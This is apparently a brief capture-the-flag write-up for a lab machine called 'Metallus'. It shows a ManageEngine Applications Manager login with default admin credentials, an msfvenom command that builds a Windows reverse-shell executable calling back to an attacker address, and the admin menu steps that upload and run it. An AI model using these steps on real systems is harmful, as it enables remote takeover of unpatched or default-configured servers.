# Metallus

### Enumeration

```
40443/tcp open  unknown
```

ManageEngine Applications Manager

Default credentials -> admin:admin

Applications Manager 14700

### Access

```
$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.49.112 LPORT=80 -f exe -o shell.exe
```

Admin -> Tools -> Upload Files and Binaries

**Checked** - Upload Script to \<Product\_Home>/working/

→ Execute Program

**Program to Execute:** shell.exe

**Directory to execute Program:** C:\Program Files\ManageEngine\AppManager14\working\\

→ Create Action -> Execute
